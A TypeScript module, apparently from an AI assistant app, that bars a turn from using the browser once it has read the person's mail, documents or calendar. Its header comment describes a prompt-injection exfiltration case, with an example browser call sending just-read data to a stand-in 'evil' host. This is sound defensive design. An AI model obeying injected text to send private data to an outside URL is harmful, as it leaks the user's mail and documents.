/**
 * What a turn has already touched, and what that costs it.
 *
 * The chair holds both halves of an exfiltration: it reads the mail, the
 * documents and the calendar, and it drives a browser that can open any URL.
 * A mail body that talks it into `browser_navigate("https://evil/?q=<what it
 * just read>")` needs no click and leaves no trace on this bench. The written
 * safety model said "agents that read stranger text cannot fetch, run or send",
 * and the browser arrived after it.
 *
 * Rather than taking the browser away — which is a capability the chair is
 * genuinely useful for — a turn may hold either half, not both. Reading
 * something of the person's closes the browser and bars it for the rest of
 * that turn, whichever order the two came in: after the read there is nothing
 * to carry anything out with, and a turn that browsed first is in the same
 * place the moment it reads.
 *
 * Per turn, because that is the unit a prompt injection acts within: the next
 * turn starts clean, and the person browsing the pane themselves is not a turn
 * at all.
 */

/** Turn ids that have read something private. Bounded: turn ids are per CLI run. */
const barred = new Set<string>();

/** A few turns' worth. The only reader is the browser's own start route. */
const MAX_REMEMBERED = 64;

export function barBrowsing(turn: string): void {
  barred.add(turn);
  // Oldest first, which is insertion order for a Set.
  for (const old of barred) {
    if (barred.size <= MAX_REMEMBERED) break;
    barred.delete(old);
  }
}

export function browsingBarred(turn: string | undefined): boolean {
  return turn !== undefined && barred.has(turn);
}

/** Test seam: module state, and a test file is one process. */
export function resetTaint(): void {
  barred.clear();
}
